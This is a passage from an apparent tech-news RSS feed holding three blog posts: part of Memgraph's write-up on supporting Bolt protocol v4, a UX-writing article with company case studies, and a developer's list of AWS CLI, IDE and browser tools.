<p>First, we need to know how to exchange messages. Bolt exchanges its messages using a request-response pattern between the client and the server. Each request message can be followed by zero or record messages  which are then followed by one summary message. The different possibilities for record messages depends on the type of the request message.</p>
<hr>
<p><strong>NOTE</strong></p>
<p>A record message is a type of message which contains records, aka result rows.</p>
<hr>
<p>Also, we need to know how to serialize our data. Bolt uses its own
<a href="https://7687.org/packstream/packstream-specification-1.html#version1">PackStream</a> which provides specification for serializing a bunch of different types of data. It is fully compatible with the types
supported by Cypher. We won‚Äôt go into details but every type is defined with its marker, its size and its data.</p>
<p><img src="https://i.imgur.com/2GkXojm.png" alt=""></p>
<p><em>Source:</em> <em><a href="https://7687.org/packstream/packstream-specification-1.html">https://7687.org/packstream/packstream-specification-1.html</a></em></p>
<p>One of those types is a structure. The size of the structure defines how many fields
it contains and the fields can be of any other type. But we‚Äôre missing an
important information. How do we know what the structure represents? Structures
carry additional data, its tag byte. This tag tells us what does the structure
represent. We‚Äôre now half way through to understanding how to define request and
response messages.</p>
<p>We can‚Äôt expect that our data will always be small enough to send it all at
once. To solve this problem, Bolt defines how the message is chunked. Each chunk
is starts with two-byte header that tells us the size of chunk data in bytes
followed by the chunk data itself. Now, we have another problem. How do we know
if we received the last chunk of message? We just add a marker! In our case we
append to the end of the last chunk <code>00 00</code>.</p>
<p>Now, we have everything we need to define our messages. We can define each type
of request/response message as a unique structure, having a unique set of fields.
We can send the defined structure using the chunking method defined before.
We‚Äôre set! We can serialize and deserialize messages now!</p>
<h4>Bolt Protocol Specifications</h4>
<p>A good protocol specification should contain as much information as possible.
Without enough information, we can only guess how our server or client should
behave in some situations, causing a lot of headache for every developer that
tries to implement that protocol.</p>
<p>So, as a good protocol, Bolt defines how to parse different types of request
message and send the correct response message. It defines how each request
message looks and what to send as a response message in each possible
situation. Also, it defines the state of server after each request message and
its outcome.</p>
<p>If want to delve deeper into the Bolt Protocol specifications, you can find everything <a href="https://7687.org/">here</a>.</p>
<hr>
<p><strong>NOTE</strong></p>
<p>Implementing rules is not hard, but to do it efficiently requires a lot of
careful planning and having a good understanding of how the protocol works.</p>
<hr>
<h2>Evolution of the Bolt Protocol</h2>
<p>As with any software, protocols are susceptible to change. Bolt defines it‚Äôs
version using major and minor versions. At the start of each connection, the
client needs to do a handshake with the server.</p>
<p>The handshake is really simple and consists of only two steps:</p>
<ul>
<li>client sends at most 4 versions it supports, sorted by priority</li>
<li>server responds with the first version in the list it supports</li>
</ul>
<h3>But doesn‚Äôt Memgraph support Bolt protocol?</h3>
<p>Yes, Memgraph does support the Bolt protocol. But up until now, it only supported Bolt v1, while the current version is 4.1. By looking at the handshake process we can conclude that the client can support <strong>at most</strong> four versions. The logical thinking is that the client will always support the latest 4 versions. At the time of writing this, the latest version is v4.1, which pushed v1 out of the support list, making us, and everyone else that wanted to try Memgraph using Neo4j‚Äôs drivers, very sad.</p>
<p><img src="https://i.imgur.com/OC6Tzd2.png" alt=""></p>
<hr>
<p><strong>NOTE</strong></p>
<p>It‚Äôs important to emphasize that after version 1.0, newer versions weren‚Äôt documented,
which made keeping up with the newer versions really hard. But, after v4.1, Neo4j
decided to document every version nicely making our lives much easier. Thanks
Neo4j!</p>
<hr>
<h2>The Road to Bolt v4.(1)</h2>
<p>Since Memgraph was only compatible with the first version of the Bolt protocol, we had three major and one minor version change to catch up with.Most of it was just some basic additions to the already existing messages, but there were also some bigger changes. For example, we made the decision to preserve support for Bolt v1. This has been very challenging as one of the hardest things in programming is making bigger changes to an existing code while not breaking the old behaviour.</p>
<h3>Supporting multiple versions</h3>
<p>Handling a code that behaves differently for each version can be hard. After we
decide on a version for a specific connection, we need to be careful which messages
are allowed for that version, which response should each message produce, what
parameters are allowed, and many more things. And to do that while reusing as much
of code as possible, with the addition of keeping the readability can be a challenge.
The only real advice I can give you here is write as many tests that will cover as
much as possible because a smallest detail can make your server misbehave while
implementing a support for a protocol.</p>
<h3>Making transaction handling easier and more powerful</h3>
<p>In Bolt v3, new request messages for handling transactions were added. Those messages
are for starting an explicit transaction and ending the transaction by
committing or rollbacking the changes.
Because we already had support for transactions and you could already do
the same thing by running queries consisting of <code>BEGIN</code>, <code>COMMIT</code> and <code>ROLLBACK</code>
commands, the only thing we had to do was add functions that directly run those
queries when the corresponding request was received.</p>
<h3>Getting some results from here and some from there</h3>
<p>The biggest change to the Bolt protocol was the change to the <code>PULL</code> and
<code>DISCARD</code> message.
Before we delve deeper, let‚Äôs explain those messages.
When you want to run a query on a server using Bolt messages, first you need to
send a <code>RUN</code> message that contains the query we want to execute. To get the results
of the query we send a <code>PULL</code> message, and if we want to discard the results,
we simply send the <code>DISCARD</code> message. The natural way of handling this is preparing
the query when we receive the <code>RUN</code> message and executing it when we receive the
<code>PULL</code> message. Additionally, to avoid wasting memory, we don‚Äôt keep the result, we
just forward it to the encoder and send it directly to the client.</p>
<p>In Bolt v1, there were <code>PULL_ALL</code> and <code>DISCARD_ALL</code> messages. As their name suggests,
the only options you had was all or nothing. Taking this into account, we developed
a solution that would simply stream all the results to the client after it receives
<code>PULL_ALL</code> message. But, since v4.0, things got a little more complicated.
The <code>PULL_ALL</code> message was renamed to <code>PULL</code>. Additionally, the <code>PULL</code> message can come with some extra parameters.</p>
<p><img src="https://i.imgur.com/4ibg9Db.png" alt=""></p>
<h4><code>n</code> parameter</h4>
<p>You can now pull an arbitrary number of results. This small change implies a lot of
changes to the existing code. The easiest solution would be to execute the query on the
first pull and save all of the results in memory. After that, for each pull, we just
send next <code>n</code> results. Even though it‚Äôs the easiest solution to implement, it‚Äôs too
inefficient memory-wise. Taking this into account, we have a hard requirement of
keeping the old, lazy behaviour while not keeping any of the results in memory.</p>
<p>There are different types of queries and each query demands a different approach to
achieve this behaviour. Queries with a constant size of the result, like profiling and
explain queries, can have a simple vector of results from which the results are
lazily pulled. For most of the queries that have variable size of the result, we
prepare all the necessary resources for the execution and ask for the next result only
when it‚Äôs needed after which the results are streamed instantly to the client.
The resources are cleaned after the <code>PULL</code> request that returned the
last result. This is possible because of Memgraph‚Äôs lazy way of handling the execution.</p>
<p>The query that was surprisingly the hardest to implement lazily was the <code>DUMP</code> query.
By itself, it‚Äôs really simple to implement this query. You analyse different parts of
your database and, as a result, send a query that defines that part. For example, we
iterate each vertex in our database, and we send back ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://memgraph.com/blog/memgraph-1-2-release-implementing-the-bolt-protocol-v4">https://memgraph.com/blog/memgraph-1-2-release-implementing-the-bolt-protocol-v4</a></em></p>]]>
            </description>
            <link>https://memgraph.com/blog/memgraph-1-2-release-implementing-the-bolt-protocol-v4</link>
            <guid isPermaLink="false">hacker-news-small-sites-24931364</guid>
            <pubDate>Thu, 29 Oct 2020 15:13:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How UX Copy Drives Better Business Results]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24931351">thread link</a>) | @tomericco
<br/>
October 29, 2020 | https://www.frontitude.com/blog/how-ux-copy-drives-better-business-results | <a href="https://web.archive.org/web/*/https://www.frontitude.com/blog/how-ux-copy-drives-better-business-results">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="HeroSection"><div><p>You probably remember those days when the term ‚ÄúUX‚Äù was formed. It was around the early 2000s when product companies started to realize that not only should their products look good, but they should also be easy to use. Throughout these years, product companies embraced new terms and methodologies to fulfill this new standard: Design Components (or Symbols), Design Systems, Responsive Web Design (RWD), and more. A new title was formed - the UX Designer. As a result, a new wave of tools came up to support this transition: Sketch, Adobe XD, and Figma (among others) empowered UX professionals to fulfill the new requirements.</p><div><h3><strong>The rise of UX Writing</strong></h3><p>Until recent years, it was mostly about visual design. Another ingredient of the user experience, the textual content, was pretty much neglected. But not anymore. These days, product companies have started to realize the importance of it and its effect on the overall user experience and business performance. Just like the transition in visual design, this one is also forming new terms and methodologies: Microcopy, UX Copy, UX Writing, Content Design, Content Style Guide, and more. Also here, a new title was formed - the UX Writer, which is something between a Copywriter and a UX Designer. This new profession has led to new books (our favorite, <a href="https://www.microcopybook.com/" target="_blank">Microcopy - The Complete Guide</a>), courses (such as <a href="https://uxwritinghub.com/" target="_blank">UX Writing Hub‚Äôs</a>), conferences (such as <a href="https://www.uxwriterconference.com/" target="_blank">UX Writer</a>), and communities that came out to support the learning and training of these new professionals.</p></div><div><p><a href="#"><img src="https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f992eedd7b266f594c98aa7_business-metrics-cover.jpg" loading="lazy" sizes="(max-width: 479px) 92vw, (max-width: 767px) 93vw, 680px" srcset="https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f992eedd7b266f594c98aa7_business-metrics-cover-p-1080.jpeg 1080w, https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f992eedd7b266f594c98aa7_business-metrics-cover.jpg 1260w" alt=""></a></p><p>Photo by David Travis (Unsplash)<a href="https://unsplash.com/?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText"></a><br></p></div><div><h3><strong>It‚Äôs all about the business</strong></h3><p>Both of the transitions mentioned above took (and are still taking) place for only a single reason: it‚Äôs good for business. The success of digital products (mainly websites, mobile apps, and web apps) is measured by a few metrics, which may vary from product to product, but are usually based on conversion rates, click-through rates, and retention. Good UX copy affects the aforementioned business metrics by effortlessly guiding users through an experience to an intended goal or objective.</p><p>To make this statement more concrete, we have gathered a few up-to-date real-world examples from the community, where better UX copy has significantly improved business metrics.<br></p></div><div><h3><strong>Case study #1: Increase user retention by speaking your users‚Äô language</strong></h3><p><a href="https://preply.com/" target="_blank">Preply</a> is an educational platform that connects more than 100,000 students with tutors worldwide for personalized language lessons online. <a href="http://www.linkedin.com/in/viktoria-kosiak" target="_blank">Viktoria Kosiak</a>, a UX Writer at Preply, describes how they improved key metrics of their business by testing and changing UX copy at the heart of their product.</p><p><br>Viktoria: ‚ÄúA core part of Preply‚Äôs product is a system for scheduling lessons. Students have two ways of planning their learning: schedule individual lessons by choosing each date manually (<em>One-by-one</em>), or set up a recurring routine where lessons are scheduled automatically each week (<em>Weekly</em>).‚Äù</p></div><div><p><a href="#"><img src="https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f9531fb8b955bd956f9704c_preply1.jpg" loading="lazy" sizes="(max-width: 479px) 92vw, (max-width: 767px) 93vw, 680px" srcset="https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f9531fb8b955bd956f9704c_preply1-p-500.jpeg 500w, https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f9531fb8b955bd956f9704c_preply1-p-800.jpeg 800w, https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f9531fb8b955bd956f9704c_preply1-p-1080.jpeg 1080w, https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f9531fb8b955bd956f9704c_preply1.jpg 1426w" alt=""></a></p><p>Scheduling lessons UI before the copy change (Preply)<br></p></div><div><p>‚ÄúWe believe that learning is effective when it‚Äôs regular. Plus, students with a weekly schedule are the ones with better retention, so promoting weekly lessons has always been in the best interest of our business.‚Äù</p><p>‚ÄúThe problem was that the number of scheduled weekly lessons was lower than we expected. According to the <a href="https://www.nngroup.com/articles/user-centric-language/" target="_blank">Features vs. Benefits approach</a>, <em>Weekly lessons</em> is focused on the way the feature works, rather than the user benefit.‚Äù</p><p><br>‚ÄúTo focus more clearly on the benefits of a weekly schedule, our solution was to change the copy from <em>Weekly lessons</em> to <em>Regular lessons</em>. We also knew from user interviews that our customers used the word <em>regular</em> to speak positively about forming a learning habit. Under this test, we also changed <em>One-by-one lessons</em> to <em>Single lessons</em> because we thought it would be easier to understand when seen next to <em>Regular lessons</em>.‚Äù</p></div><div><p><a href="#"><img src="https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f9531fa41891a144778ed6c_preply2.jpg" loading="lazy" sizes="(max-width: 479px) 92vw, (max-width: 767px) 93vw, 680px" srcset="https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f9531fa41891a144778ed6c_preply2-p-800.jpeg 800w, https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f9531fa41891a144778ed6c_preply2-p-1080.jpeg 1080w, https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f9531fa41891a144778ed6c_preply2.jpg 1543w" alt=""></a></p><p>Using users‚Äô language to name the lesson type has increased the number of scheduled regular lessons by 11% (Preply)<br></p></div><div><h4><strong>Business impact</strong></h4><p>The Preply team reports a significant increase of 11%(!) in the number of <em>regular lessons scheduled</em>. Also, they‚Äôve identified a significant increase of 7.8% in one of their key business metrics: <em>hours bought on the platform</em>.</p></div><div><h3><strong>Case study #2: Increase click-through rate (CTR) by adding clarity</strong></h3><p><a href="https://fundbox.com/" target="_blank">Fundbox</a> is a B2B fintech startup that offers a revolving line of credit to small- and medium-sized businesses in the US. <a href="https://twitter.com/YaelBenDavid" target="_blank">Yael Ben-David</a>, a UX Writer at Fundbox, describes how the company increased revenue with a few copy changes.</p><p>Yael: ‚ÄúIn our product, the most important touchpoint for revenue, is the Draw Pane, which is a dialogue users use to draw funds. It can be opened through the user dashboard using a button with the label <em>Draw Funds</em>. It seemed like users were too scared to click it since it sounded very final. They thought it would immediately pull funds into their account and they wouldn't have a chance to review the repayment terms first. They never finished drawing because of that.‚Äù</p><p><br>‚ÄúTo make it clearer, we changed the CTA from <em>Draw Funds</em> to <em>Review &amp; Draw</em>.‚Äù</p></div><div><p><a href="#"><img src="https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f9531fb1d99c05198df5683_fundbox1.jpg" loading="lazy" sizes="(max-width: 479px) 92vw, (max-width: 767px) 93vw, 680px" srcset="https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f9531fb1d99c05198df5683_fundbox1-p-500.jpeg 500w, https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f9531fb1d99c05198df5683_fundbox1-p-800.jpeg 800w, https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f9531fb1d99c05198df5683_fundbox1-p-1080.jpeg 1080w, https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f9531fb1d99c05198df5683_fundbox1.jpg 1600w" alt=""></a></p><p>A call-to-action button that is more empathetic to the user‚Äôs headspace and better manages expectations led to a higher CTR (Fundbox)<br></p></div><div><h4><strong>Business impact</strong></h4><p>One of the core metrics at Fundbox is <em>whether users draw funds in the first 7 days after approval</em>, which is a strong indicator of customer LTV (lifetime value). After the change in the copy, a significant improvement was shown in this metric, and in credit draws overall.</p></div><div><h3><strong>Case study #3: Reduce sales team calls by being more informative</strong></h3><p>It‚Äôs Fundbox again! This time, a few copy changes saved a lot of manual labor for their sales team. Yael is here again to tell us about it.</p><p>Yael: ‚ÄúAs I mentioned before, the Draw Pane is a critical point in our product, which is where users draw funds. Many users didn‚Äôt understand the terms for repaying the funds, and so obviously, they didn‚Äôt draw. Reps would then reach out to explain the terms on the phone, and then the user would be comfortable drawing.‚Äù</p><p>‚ÄúWe ran an A/B test:</p><ol role="list"><li>We removed some of the copy from the tab headers to prevent confusion‚Äîusers weren‚Äôt sure whether we were showing the weekly payment (principal + fees) or only the fees. The information appears lower down in a clearer way so we didn‚Äôt need it here, too.</li><li>We added a tooltip to preempt questions and hesitations users had around the weekly fees.</li><li>We added <em>Max</em> to <em>total repayment</em> since there is a way that users can save on fees and actually never end up paying the full amount of fees. Without saying <em>Max</em> it looked like no matter what, they would end up paying back this whole amount.‚Äù</li></ol></div><div><p><a href="#"><img src="https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f9531fbce23b43214f25407_fundbox2.jpg" loading="lazy" sizes="(max-width: 479px) 92vw, (max-width: 767px) 93vw, 680px" srcset="https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f9531fbce23b43214f25407_fundbox2-p-500.jpeg 500w, https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f9531fbce23b43214f25407_fundbox2-p-800.jpeg 800w, https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f9531fbce23b43214f25407_fundbox2-p-1080.jpeg 1080w, https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f9531fbce23b43214f25407_fundbox2.jpg 1600w" alt=""></a></p><p>A few copy changes in the Draw Pane significantly reduced sales team calls (Fundbox)<br></p></div><div><h4><strong>Business impact</strong></h4><p>The sales team reported a significant decrease in the time they spent helping users through this point of friction.<br></p></div><div><h3><strong>Case study #4: Reduce support tickets by giving a heads up</strong></h3><p><a href="https://www.gong.io/" target="_blank">Gong.io</a> provides a revenue intelligence platform created to improve calls and demos for sales teams. <a href="https://www.linkedin.com/in/naomipapoushado/" target="_blank">Naomi Papoushado</a>, the Galactic Viceroy of Content Excellence at Gong.io, tells us how, by adding a piece of informational UX copy, they solved a technical issue that caused plenty of support tickets.</p><p>Naomi: ‚ÄúWe got a bunch of support tickets where users were trying to associate a call with an account when they were a CRM Lead and not a CRM Contact.‚Äù<br></p></div><div><p><a href="#"><img src="https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f9531f9229cf04f13c31064_gong1.jpg" loading="lazy" sizes="(max-width: 479px) 92vw, (max-width: 767px) 93vw, 680px" srcset="https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f9531f9229cf04f13c31064_gong1-p-500.jpeg 500w, https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f9531f9229cf04f13c31064_gong1.jpg 778w" alt=""></a></p><p>Associating call CTA (Gong.io)<br></p></div><div><p>‚ÄúPeople wanted to assign the call to a CRM Lead, but the option to associate the call was unavailable. They couldn‚Äôt understand why it wasn't working. So they‚Äôd open a ticket for the Support team, thinking it‚Äôs a bug in our system.‚Äù</p><p>‚ÄúThe Support team appealed to us (the UX team) about this issue. We chose to solve this by giving users a clear message explaining which accounts can be assigned with the call, and how to resolve the issue.‚Äù<br></p></div><div><p><a href="#"><img src="https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f9531fb96b9ca6674e16de1_gong2.jpg" loading="lazy" sizes="(max-width: 479px) 92vw, (max-width: 767px) 93vw, 680px" srcset="https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f9531fb96b9ca6674e16de1_gong2-p-1080.jpeg 1080w, https://uploads-ssl.webflow.com/5d8a6b791edc3c85e80d2871/5f9531fb96b9ca6674e16de1_gong2.jpg 1538w" alt=""></a></p><p>A clear explanation of the issue and a suggestion solution have significantly reduced support tickets (Gong.io)<br></p></div><div><h4><strong>Business impact</strong></h4><p>A short time after this change was released, Gong.io‚Äôs Support team reported zero(!) support tickets opened for this specific issue. It‚Äôs amazing how a small piece of text can save users so much frustration, and the Support team precious time.<br></p></div><div><h3><strong>Bottom line</strong></h3><p>The rise of UX Writing, which is taking place these days, is not just a flash in the pan. It‚Äôs proven that investing in creating great UX copy is a positive ROI deal. The examples above show that great UX copy not only enhances the user experience, but can also release bottlenecks at the core of your product and move the needle when it comes to business metrics.</p><h4><em>Looking for more examples like those we showed here? Asking yourself how you can deliver great UX copy at scale? We‚Äôre going to write about it in-depth in future posts. If you‚Äôre finding this interesting, </em><a href="#Blog-Subscribe-Form"><em>subscribe below</em></a><em> to get new posts to your inbox right when they‚Äôre out of the oven.</em><br></h4></div><div id="Demo-Form" data-w-id="5e1eb963-7815-90d1-c6f0-24fe8ff5b72d"><h2>Want to get more stories?</h2><p>Stay in the know with more stories about UX, content, workflows, and in between. You‚Äôll be the first to know when we post new content.</p><div id="Blog-Subscribe-Form"><div id="form-success-message"><p><strong>You have successfully subscribed for updates!</strong><a href="https://calendly.com/baraksi/frontitude-demo" target="_blank"><span><br></span></a></p></div><div><p>Oops! Something went wrong. Please try again<br>or contact us at hi@frontitude.com</p></div></div></div></div></div></div>]]>
            </description>
            <link>https://www.frontitude.com/blog/how-ux-copy-drives-better-business-results</link>
            <guid isPermaLink="false">hacker-news-small-sites-24931351</guid>
            <pubDate>Thu, 29 Oct 2020 15:12:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My AWS toolbox ‚Äì tools, plugins and applications]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24931347">thread link</a>) | @mradzikowski
<br/>
October 29, 2020 | https://betterdev.blog/my-aws-toolbox/ | <a href="https://web.archive.org/web/*/https://betterdev.blog/my-aws-toolbox/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Developers, like all specialists, discover and collect their favorite tools over time. Having a good, proven set of tools makes the work easier and more pleasant. We can focus on getting the job done. Sometimes eliminating minor inconveniences or improving a small element of everyday activity makes the greatest impact on the comfort of work.</p>



<p>It‚Äôs not always easy to find the best tools. There is a wide choice. More importantly, everyone has different habits and preferences. The best way is to test them yourself and see what suits you.</p>



<p>To help a little bit with that, here I present a collection of my AWS tools. These are applications, plugins, and extensions that I use in my daily work with AWS.</p>



<h2><span id="cli"></span>CLI<span></span></h2>



<h3><span id="aws_cli"></span>AWS CLI<span></span></h3>



<p>The <a href="https://aws.amazon.com/cli/"><strong>AWS CLI</strong></a> is the obvious first position on this list. After all, sometimes it‚Äôs just quicker to do something in the CLI. Other times we need to wrap some process interacting with AWS in a simple script.</p>



<p>The AWS CLI v2 has some nice features, such as improved command completion. I‚Äôm using a <a href="https://fishshell.com/">fish shell</a> in the terminal and AWS CLI <a href="https://github.com/aws/aws-cli/issues/1079">does not natively provide</a> command completion for it. Fortunately, fish is extremely good with completions, so the fix is quite easy. It‚Äôs enough to add one (quite long) line to the config file and it works like a charm.</p>



<p><code>~/.config/fish/config.fish</code>:</p>



<pre><code>test -x (which aws_completer); and complete --command aws --no-files --arguments '(begin; set --local --export COMP_SHELL fish; set --local --export COMP_LINE (commandline); aws_completer | sed \'s/ $//\'; end)'</code></pre>







<div><figure><a href="https://betterdev.blog/app/uploads/2020/10/fish-aws-cli-v2-completion.png" target="_blank" rel="noopener noreferrer"><img loading="lazy" src="https://betterdev.blog/app/uploads/2020/10/fish-aws-cli-v2-completion.png" alt="AWS CLI v2 completion in fish shell" width="1027" height="106" srcset="https://betterdev.blog/app/uploads/2020/10/fish-aws-cli-v2-completion.png 2054w, https://betterdev.blog/app/uploads/2020/10/fish-aws-cli-v2-completion-300x31.png 300w, https://betterdev.blog/app/uploads/2020/10/fish-aws-cli-v2-completion-1024x106.png 1024w, https://betterdev.blog/app/uploads/2020/10/fish-aws-cli-v2-completion-768x79.png 768w, https://betterdev.blog/app/uploads/2020/10/fish-aws-cli-v2-completion-1536x159.png 1536w, https://betterdev.blog/app/uploads/2020/10/fish-aws-cli-v2-completion-2048x211.png 2048w" sizes="(max-width: 1027px) 100vw, 1027px"></a><figcaption>AWS CLI v2 completion in fish</figcaption></figure></div>



<h3><span id="asp_plugin_for_ohmyfish"></span>asp plugin for oh-my-fish<span></span></h3>



<p>As mentioned above, I‚Äôm using a fish shell. True beauty and power of it can be unlocked with <a href="https://github.com/oh-my-fish/oh-my-fish">Oh My Fish</a>, which is basically a plugin and theme manager for the shell.</p>



<p>The OMF plugin I use daily when working with AWS is <a href="https://github.com/m-radzikowski/omf-plugin-asp"><strong>asp</strong></a>. It‚Äôs a small, handy plugin that allows changing the currently selected AWS profile. I took it over from the original author and I‚Äôm its maintainer right now.</p>



<div><figure><img loading="lazy" src="https://betterdev.blog/app/uploads/2020/10/fish-asp-plugin.png" alt="Oh My Fish asp plugin for AWS profile change" width="245" height="223" srcset="https://betterdev.blog/app/uploads/2020/10/fish-asp-plugin.png 489w, https://betterdev.blog/app/uploads/2020/10/fish-asp-plugin-300x273.png 300w" sizes="(max-width: 245px) 100vw, 245px"><figcaption>Oh My Fish asp plugin</figcaption></figure></div>



<p>If you are using zsh instead of fish, a <a href="https://github.com/ohmyzsh/ohmyzsh/blob/master/plugins/aws/README.md">similar plugin</a> exists also for <a href="https://github.com/ohmyzsh/ohmyzsh">Oh My Zsh</a>.</p>



<h2><span id="infrastructure_as_code"></span>Infrastructure as Code<span></span></h2>



<h3><span id="serverless_framework"></span><img loading="lazy" width="94" height="150" src="https://betterdev.blog/app/uploads/2020/10/serverless-framework-logo.png" alt=""> Serverless Framework<span></span></h3>



<p>The <a href="https://www.serverless.com/"><strong>Serverless Framework</strong></a> is the most basic tool for my work with AWS. The built-in functionalities and number of community plugins accelerate infrastructure development. Even when creating just ‚Äúordinary‚Äù stacks, without any Lambda functions or other plugin-driven resources, writing CloudFormation with syntax extended by Serverless (for example, with variables) is far easier.</p>



<p>While CloudFormation is not always the best, it‚Äôs the default IaC for AWS and supported by them. The Serverless Framework is, in fact, building and deploying normal CloudFormation templates. That gives me confidence that I‚Äôm depending mostly on AWS, without additional parties. Anything that is not directly supported by Serverless or its plugins can be created using raw CloudFormation in the stack. This makes the IaC, the critical element of systems, stable and powerful.</p>



<div><figure><img loading="lazy" width="350" height="419" src="https://betterdev.blog/app/uploads/2020/10/serverless-stack-with-cf.png" alt="Sample Serverless stack with raw CloudFormation resource" srcset="https://betterdev.blog/app/uploads/2020/10/serverless-stack-with-cf.png 350w, https://betterdev.blog/app/uploads/2020/10/serverless-stack-with-cf-251x300.png 251w" sizes="(max-width: 350px) 100vw, 350px"><figcaption>Sample Serverless stack with raw CloudFormation resource</figcaption></figure></div>



<h2><span id="chrome_extensions"></span>Chrome extensions<span></span></h2>



<h3><span id="aws_extend_switch_roles"></span><img loading="lazy" width="128" height="128" src="https://betterdev.blog/app/uploads/2020/10/aws-extend-switch-roles-icon.jpg" alt=""> AWS Extend Switch Roles<span></span></h3>



<p>If you are working on multiple AWS accounts and/or using various roles, then you must know the pain of switching between them in the AWS Console. The site remembers your past roles, so you don‚Äôt have to provide the role name and account ID every time. At least as long as you have no more than 5 of them. That‚Äôs the limit of roles history, after which they are overridden.</p>



<p>Here to help comes <a href="https://chrome.google.com/webstore/detail/aws-extend-switch-roles/jpmkfafbacpgapdghgdpembnojdlgkdl"><strong>AWS Extend Switch Roles</strong></a> extension. The configuration is dead simple ‚Äì you just copy the content of <code>~/.aws/config</code> file. From that point, when you click on the extension icon, you will get a nice, filterable list of all defined roles to choose from. And you can have as many of them as you need.</p>



<div><figure><img loading="lazy" width="436" height="290" src="https://betterdev.blog/app/uploads/2020/10/aws-extend-switch-roles-plugin-1.png" alt="AWS Extend Switch Role extension" srcset="https://betterdev.blog/app/uploads/2020/10/aws-extend-switch-roles-plugin-1.png 436w, https://betterdev.blog/app/uploads/2020/10/aws-extend-switch-roles-plugin-1-300x200.png 300w, https://betterdev.blog/app/uploads/2020/10/aws-extend-switch-roles-plugin-1-360x240.png 360w" sizes="(max-width: 436px) 100vw, 436px"><figcaption>AWS Extend Switch Role extension</figcaption></figure></div>



<p>Available also for <a href="https://addons.mozilla.org/en-US/firefox/addon/aws-extend-switch-roles3/">Firefox</a>.</p>



<h3><span id="aws_simple_iconification_service"></span><img loading="lazy" width="128" height="128" src="https://betterdev.blog/app/uploads/2020/10/aws-simple-iconification-service-icon.jpg" alt=""> AWS Simple Iconification Service<span></span></h3>



<p>This one is from the category ‚Äúsmall but delightful‚Äù. <a href="https://chrome.google.com/webstore/detail/aws-simple-iconification/edagjlhogddnlkbkllibfhbekpcdppbk"><strong>AWS Simple Iconification Service</strong></a> extension fixes favicons in AWS Console.</p>



<p>The fact that half of the service pages in AWS Console has one of two versions of the same default favicon (<img loading="lazy" width="16" height="16" src="https://betterdev.blog/app/uploads/2020/10/aws-favicon-1.png" alt=""> and <img loading="lazy" width="16" height="16" src="https://betterdev.blog/app/uploads/2020/10/aws-favicon-2.png" alt="">) is somehow astonishing. The fact that the other half has favicons in a few different styles, from 3D to flat, is just amusing. Well, we all know that the UI is not the AWS team priority, and the whole site looks a little bit like a Frankenstein‚Äôs monster.</p>



<p>But identical or inconsistent favicons are not only hurting someone‚Äôs sensitive UI feelings. It also makes it more difficult to quickly find one of 15 currently open AWS Console tabs during development. Or, worse case, while looking for the cause of an error on the production on some pleasant Friday afternoon.</p>



<p>With the Iconification extension, all services have their own favicons, from the official AWS architecture icons.</p>



<div><figure><img loading="lazy" width="719" height="86" src="https://betterdev.blog/app/uploads/2020/10/aws-simple-iconification-service-comparison.png" alt="" srcset="https://betterdev.blog/app/uploads/2020/10/aws-simple-iconification-service-comparison.png 719w, https://betterdev.blog/app/uploads/2020/10/aws-simple-iconification-service-comparison-300x36.png 300w" sizes="(max-width: 719px) 100vw, 719px"><figcaption>AWS Simple Iconification Service ‚Äì favicon comparison</figcaption></figure></div>



<p>Available also for <a href="https://addons.mozilla.org/pl/firefox/addon/simple-iconification-service/">Firefox</a>.</p>



<h2><span id="ide_plugins"></span>IDE plugins<span></span></h2>



<h3><span id="aws_toolkit_for_jetbrains"></span>AWS Toolkit for JetBrains<span></span></h3>



<p>We can argue what IDE is the best, but for me, it‚Äôs always the ones from the JetBrains stable. Thus that list could not be missing the <a href="https://aws.amazon.com/intellij/"><strong>AWS Toolkit for JetBrains</strong></a> IDE.</p>



<p>There is a slowly growing list of services that the plugin supports. As I‚Äôm not building SAM applications, so far most useful for me are the S3, CloudWatch, and CloudFormation interfaces. Being able to operate with them directly from the IDE, sometimes easier and faster than going through the AWS Console in the browser, is really handy.</p>



